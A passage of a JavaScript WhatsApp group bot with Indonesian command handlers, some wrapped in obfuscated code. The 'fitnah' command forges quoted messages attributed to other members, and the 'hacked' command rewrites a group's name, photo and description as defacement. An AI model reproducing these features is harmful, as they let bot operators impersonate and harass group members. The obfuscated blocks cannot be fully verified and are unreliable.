_0x35d092=_0x4da997(_0x47e716);var _0x2653bc=[];for(var _0x303fb6=0x0,_0x5393e4=_0x35d092['length'];_0x303fb6<_0x5393e4;_0x303fb6++){_0x2653bc+='%'+('00'+_0x35d092['charCodeAt'](_0x303fb6)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2653bc);},_0x4da9['NBUPtb']={},_0x4da9['KvLFVm']=!![];}var _0x26c6a5=_0x5cb4[0x0],_0x3cc6f4=_0x596c96+_0x26c6a5,_0x59124d=_0x4da9['NBUPtb'][_0x3cc6f4];return _0x59124d===undefined?(_0x5cb47e=_0x4da9['NuHSmw'](_0x5cb47e),_0x4da9['NBUPtb'][_0x3cc6f4]=_0x5cb47e):_0x5cb47e=_0x59124d,_0x5cb47e;}(function(_0x5db211,_0x75c590){var _0x14096e=_0x4da9;while(!![]){try{var _0x1d4e68=parseInt(_0x14096e(0x1b4))*parseInt(_0x14096e(0x1b3))+parseInt(_0x14096e(0x1b2))*parseInt(_0x14096e(0x1a8))+-parseInt(_0x14096e(0x1aa))*-parseInt(_0x14096e(0x1a7))+parseInt(_0x14096e(0x1af))*-parseInt(_0x14096e(0x1ae))+parseInt(_0x14096e(0x1ad))*-parseInt(_0x14096e(0x1a9))+parseInt(_0x14096e(0x1ac))*parseInt(_0x14096e(0x1b5))+-parseInt(_0x14096e(0x1b1))*parseInt(_0x14096e(0x1b0));if(_0x1d4e68===_0x75c590)break;else _0x5db211['push'](_0x5db211['shift']());}catch(_0x1cbc7a){_0x5db211['push'](_0x5db211['shift']());}}}(_0x5cb4,0x71bda),ppgc=await dila[_0x46a50d(0x1b6)](from),teks=args['join']('\x20'),sksks=body[_0x46a50d(0x1ab)](0xb),options={'sendEphemeral':!![],'thumbnail':await imageToBase64(ppgc)},await dila['sendMessage'](from,''+sksks,text,options,{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]}}));
					  break
               case 'hacked':
               if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
               reply(dla.wait())
               tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   dila.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                dila.groupUpdateSubject(from, `Hacked By ${body.slice(8)}`)
                await sleep(1000)
                dila.groupUpdateDescription(from, `*_Hacked By ${pushname}_*`)             
                await sleep(1000)
                dila.sendMessage(from, `Sukses Hack Grup ${groupMetadata.subject}`, text, {quoted: Lan})
              break  
				case 'sticktag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                                        if (!isQuotedSticker) return reply('Reply stickernya!')
                                        boij = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                                        delb = await dila.downloadMediaMessage(boij)
                                        await fs.writeFileSync(`stctagg.webp`, delb)
                                        var group = await dila.groupMetadata(from)
                                        var member = group['participants']
                                        var mem = []
                                        member.map(async adm => {
                                                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                                        })
					var itsme = `0@s.whatsapp.net`
					var split = `Sticker Tag`
					var selepbot = {
						contextInfo: {
							mentionedJid: mem,
                                                        participant: itsme,                                                                                                                          quotedMessage: {
                                                                extendedTextMessage: {
                                                                text: split,
							   }
					      	      }
					       }
					}
					result = fs.readFileSync(`stctagg.webp`)
                                        dila.sendMessage(from, result, sticker, selepbot)
					await fs.unlinkSync(`stctagg.webp`)
					break
					case 'imgtag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                    if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
                        filePath = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await dila.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = { contextInfo: { mentionedJid: mem },
                            quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "Image Tag", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486"} } }
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        dila.sendMessage(from, ini_buffer, image, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Reply imagenya!`)
                    }
                    break
					case 'autosticker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`Penggunaan:\n\n${prefix}autosticker 1\natau\n${prefix}autosticker 0`)
					if (Number(args[0]) === 1) {
						if (isAuto) return reply('Udah aktif um')
						autosticker.push(from)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
						reply(`Sukses mengaktifkan fitur autosticker di group *${groupMetadata.subject}*`)
					} else if (Number(args[0]) === 0) {
						autosticker.splice(from)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
						reply(`Sukses menonaktifkan fitur autosticker di group *${groupMetadata.subject}*`)
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break
					case 'getbio':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (args.length < 1) return reply('Tag orangnya!')
                    mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    const p = await dila.getStatus(`${mentioned}`, MessageType.text)
                    reply(p.status)
                    if (p.status == 401) {
                    reply("Error! mungkin diprivate")
                    }
                     break
                   case 'kontak':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
				if (Lan.message.extendedTextMessage != undefined){
                    mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
				argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
				if (Lan.message.extendedTextMessage != undefined){
                    		mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'totag':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
            if ((isMedia && !Lan.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !Lan.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', 
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !Lan.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !Lan.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmedia = isQuotedDocument ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !Lan.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', 
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
					case 'creategroup':
			case 'creategrup':
			if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (Lan.message.extendedTextMessage != undefined){
                    mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					dila.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break
					case 'getpict':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
            mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await dila.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            dila.sendMessage(from, pict, image, {quoted: Lan})
            break
                    case 'simih':
                    if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`usage:\n\n${prefix}simih on\n${prefix}simih off`)
					if ((args[0]) === 'on') {
						if (isSimi) return reply('Mode simi sudah aktif')
						_samih.push(from)
						fs.writeFileSync('./database/simi.json', JSON.stringify(_samih))
						reply(`Sukses mengaktifkan mode simi di group *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						if (!isSimi) return reply('Mode simi Sudah Off sebelumnya')
						_samih.splice(from, 1)
						fs.writeFileSync('./database/simi.json', JSON.stringify(_samih))
						reply(`Sukes menonaktifkan mode simi di group *${groupMetadata.subject}*`)
					} else {
						reply('On untuk mengaktifkan, Off untuk menonaktifkan')
					}
					break
				case 'welcome':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}welcome 1`)
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Sudah Aktif Kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('「 SUKSES 」Fitur Welcome Diaktifkan')
					} else if (Number(args[0]) === 0) {
						if (!isWelkom) return reply('Sudah Mati Kak')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('「 SUKSES 」Fitur Welcome Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
case 'antibule':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antibule 1`)
				    if (Number(args[0]) === 1) {
						if (isKickArea) return reply('Sudah Aktif Kak')
						kickarea.push(from)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						reply(`Sukses mengaktifkan fitur antibule di group *${groupMetadata.subject}*`)
			  } else if (Number(args[0]) === 0) {
						if (!isKickArea) return reply('Sudah Mati Kak')
						kickarea.splice(from, 1)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						reply(`Sukses menonaktifkan fitur antibule di group *${groupMetadata.subject}*`)
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
						break
				case 'leveling':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}leveling 1`)
					if (Number(args[0]) === 1) {
						if (isLevelingOn) return reply('Sudah Aktif Kak')
						_leveling.push(from)
						fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
						reply('「 SUKSES 」Fitur Level Diaktifkan')
					} else if (Number(args[0]) === 0) {
						_leveling.splice(from, 1)
						fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
						reply('「 SUKSES 」Fitur Level Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

				case 'antilink':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('「 SUKSES 」Fitur Anti Link Diaktifkan')
						dila.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('「 SUKSES 」Fitur Anti Link Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

				case 'grup':
				case 'group':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk membuka : ${prefix}group buka\nuntuk menutup : ${prefix}group tutup`)
					if (args[0] === 'buka') {
						reply(`Berhasil Membuka group`)
						dila.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`Berhasil Menutup Group`)
						dila.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break

				case 'admin':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					if (!isGroup) return reply(dla.groupo())
					adm = `*ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						adm += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(adm, groupAdmins, true)
					break

				case 'add':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply('Yang mau di add siapa?')
					if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						dila.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Anjim yang mau di add di private, dahlah :)')
					}
					break
					
					case 'hidetag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					var value = body.slice(9)
					var group = await dila.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: Lan
					}
					dila.sendMessage(from, options, text)
					break
				case 'level':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isLevelingOn) return reply(dla.lvlnoon())
					if (!isGroup) return reply(dla.groupo())
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(dla.lvlnul())
					const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
					resul = `┌「 *LEVEL* 」
│
├ ❏ *Nama* : ${pushname}
├ ❏ *Nomor* : wa.me/${sender.split("@")[0]}
├ ❏ *Xp* : ${userXp}/${requiredXp}
└ ❏ *Level* : ${userLevel}`
					dila.sendMessage(from, resul, text, { quoted: Lan })
						.catch(async (err) => {
							console.error(err)
							await reply(`Error!\n${err}`)
						})
					break

				case 'linkgrup':
				case 'linkgroup':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					if (!isGroup) return reply(dla.groupo())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					linkgc = await dila.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
					dila.sendMessage(from, yeh, text, { quoted: Lan })
					break

				case 'tagall':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					members_id = []
					taga = (args.length > 1) ? body.slice(8).trim() : ''
					taga += '\n\n'
					for (let mem of groupMembers) {
						taga += `❏ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(taga, members_id, true)
					break

				case 'setname':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					dila.groupUpdateSubject(from, `${body.slice(9)}`)
					dila.sendMessage(from, '「 SUKSES 」Mengubah Nama Grup', text, { quoted: Lan })
					break

				case 'setdesc':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					dila.groupUpdateDescription(from, `${body.slice(9)}`)
					dila.sendMessage(from, '*「 SUKSES 」Mengubah Desk Grup', text, { quoted: Lan })
					break

				case 'demote':
				case 'demot':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 𝘆𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						dem = ''
						for (let _ of mentioned) {
							dem += `*jabatan kamu di copot*🏃 :\n`
							dem += `@_.split('@')[0]`
						}
						mentions(dem, mentioned, true)
						dila.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Yahh @${mentioned[0].split('@')[0]} Jabatan kamu sebagai leluhur di grup telah di copot🏃`, mentioned, true)
						dila.groupDemoteAdmin(from, mentioned)
					}
					break

				case 'promote':
				case 'promot':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Tag Orang Nya Kak')
					mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						prom = ''
						for (let _ of mentioned) {
							prom += `Yeee?? Kamu naik jabatan >_< :\n`
							prom += `@_.split('@')[0]`
						}
						mentions(prom, mentioned, true)
						dila.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Selamat🥳 @${mentioned[0].split('@')[0]} *anda naik menjadi admin group* >_<`, mentioned, true)
						dila.groupMakeAdmin(from, mentioned)
					}
					break
case 'kick':
if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin()) 
				   if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Tag Orangnya!')
					mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `Bismillah kick beban\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						dila.groupRemove(from, mentioned)
					} else {
						mentions(`Sayonara @${mentioned[0].split('@')[0]}`, mentioned, true)
						dila.groupRemove(from, mentioned)
					}
					break
				case 'fitnah':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				var split = args.join(' ').replace(/@|\d/gi, '').split('|')
				var taged = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
				const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: split[0]
							}
						}
					}
				}
				dila.sendMessage(from, `${split[1]}`, MessageType.text, target)
				break

				case 'jadian':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isGroup) return reply(dla.groupo())
					jds = []
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					tejs = `Ciee.. yang lagi jadian\n*@${aku.jid.split('@')[0]}* ❤ *@${cintax.jid.split('@')[0]}*\nSemoga Langgeng Hii`
					jds.push(aku.jid)
					jds.push(cintax.jid)
					mentions(tejs, jds, true)
					break

				case 'del':
				case 'delete':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					dila.deleteMessage(from, { id: Lan.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break

				case 'mining':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isGroup) return reply(dla.groupo())
					if (!isEventon) return reply(`maaf ${pushname} event mining tidak di aktifkan sama owner ${ownerName}`)
					if (isOwner) {
						const one = 999999999
						addLevelingXp(sender, one)
						addLevelingLevel(sender, 99)
						reply(`karena ${ownerName} baik Bot memberikan ${one}Xp >_<`)
					} else {
						const mining = Math.ceil(Math.random() * 10000)
						addLevelingXp(sender, mining)
						await reply(`*selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					break

				case 'downloadmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const donlot = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}play\`\`\`
\`\`\`├ ${prefix}ytsearch\`\`\`
\`\`\`├ ${prefix}ytmp3\`\`\`
\`\`\`├ ${prefix}ytmp4\`\`\`
\`\`\`├ ${prefix}tiktok\`\`\`
\`\`\`├ ${prefix}tiktokaudio\`\`\`
\`\`\`├ ${prefix}igphoto\`\`\`
\`\`\`├ ${prefix}igvideo\`\`\`
\`\`\`├ ${prefix}joox\`\`\`
\`\`\`└ ${pushname}\`\`\``
var _0xdcbf=['mJmZnJaWmKv5C2Lwta','muDVsuzPqq','C2vUze1LC3nHz2u','mebZlNDOyxrZyxbWlM5LDa','lI9KBNmVDgH1BwjUywLSlMPWzwC','rg93BMXVywqGtwvUDq','ndzWzg5ZDLq','mty0mtnksePrtfi','CMvHzezPBgvtEw5J','nJu3oti2t2D6DePP','mtmWmZiZnfz2s3bUBG','mJm2mZeYzKPJExDv','mteZmJy1mxnsyuzKva','ngnvDxj5CW','mta0nte1mKvpCLLqwG'];var _0x3fbd6e=_0x46c2;function _0x46c2(_0x4737df,_0x12e172){_0x4737df=_0x4737df-0x171;var _0xdcbf69=_0xdcbf[_0x4737df];if(_0x46c2['iZnRFG']===undefined){var _0x46c248=function(_0x18886e){var _0x50f4cc='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5d8e32='';for(var _0x5478e9=0x0,_0x43360a,_0x40535b,_0x180bcd=0x0;_0x40535b=_0x18886e['charAt'](_0x180bcd++);~_0x40535b&&(_0x43360a=_0x5478e9%0x4?_0x43360a*0x40+_0x40535b:_0x40535b,_0x5478e9++%0x4)?_0x5d8e32+=String['fromCharCode'](0xff&_0x43360a>>(-0x2*_0x5478e9&0x6)):0x0){_0x40535b=_0x50f4cc['indexOf'](_0x40535b);}return _0x5d8e32;};_0x46c2['kwqPHV']=function(_0x37bbd0){var _0x5a1bfa=_0x46c248(_0x37bbd0);var _0x4bcb19=[];for(var _0x13baa3=0x0,_0x4357d7=_0x5a1bfa['length'];_0x13baa3<_0x4357d7;_0x13baa3++){_0x4bcb19+='%'+('00'+_0x5a1bfa['charCodeAt'](_0x13baa3)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4bcb19);},_0x46c2['NfjMQD']={},_0x46c2['iZnRFG']=!![];}var _0x3d2eb9=_0xdcbf[0x0],_0x151dd6=_0x4737df+_0x3d2eb9,_0x578d45=_0x46c2['NfjMQD'][_0x151dd6];return 